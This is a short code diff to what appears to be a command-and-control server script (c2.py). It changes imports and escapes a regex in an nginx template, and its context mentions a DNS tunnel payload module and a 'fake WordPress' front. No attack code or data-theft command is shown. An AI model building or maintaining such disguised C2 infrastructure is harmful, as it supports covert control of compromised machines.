@@ -6,6 +6,7 @@ c2.py
 """
 
 import os
+import sys
 import json
 import base64
 import hashlib
@@ -24,7 +25,7 @@ from typing import Dict, List, Optional, Tuple, Any
 
 from flask import Flask, request, jsonify, send_file, Response
 from cryptography.fernet import Fernet
-from Cryptodome.Cipher import AES
+from Crypto.Cipher import AES
 
 # Try to import DNS tunnel module from payloads
 try:
@@ -214,7 +215,7 @@ server {{
     }}
 
     # PHP handling (for the fake WordPress)
-    location ~ \.php$ {{
+    location ~ \\.php$ {{
         include snippets/fastcgi-php.conf;
         fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
     }}
